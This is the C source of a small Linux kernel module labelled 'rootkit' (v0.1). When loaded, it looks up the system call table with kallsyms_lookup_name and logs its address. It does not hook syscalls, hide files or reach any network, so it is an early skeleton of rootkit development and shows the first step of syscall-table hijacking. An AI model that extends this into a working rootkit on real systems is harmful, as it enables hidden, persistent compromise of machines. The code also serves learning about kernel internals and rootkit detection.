#include <linux/init.h> //__init, __exit
#include <linux/module.h> //core header for loading modules
#include <linux/kernel.h> //KERN_INFO
#include <linux/kallsyms.h> // kallsyms_lookup_name
#include <linux/unistd.h> // syscall names to numbers
#include <linux/version.h> // LINUX_VERSION_CODE

// license
MODULE_LICENSE("GPL");
MODULE_AUTHOR("wh1t3r0se");
MODULE_DESCRIPTION("rootkit");
MODULE_VERSION("0.1");

unsigned long *__sys_call_table = NULL;  // NULL == (void*)0

static unsigned long *get_syscall_table(void)
{
    unsigned long *syscall_table;

    #if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)
        syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
        return syscall_table;
    #endif

    return 0;
}

static int  __init mod_init(void)
{
    printk(KERN_INFO "rootkit: [+] hacks loaded\n");

    __sys_call_table = get_syscall_table();
    printk(KERN_INFO "rootkit: [+] syscall table found at %p\n", __sys_call_table);

    return 0;
}

static void __exit mod_exit(void)
{
    printk(KERN_INFO "rootkit: [+] hacks unloaded\n");
}

module_init(mod_init);
module_exit(mod_exit);

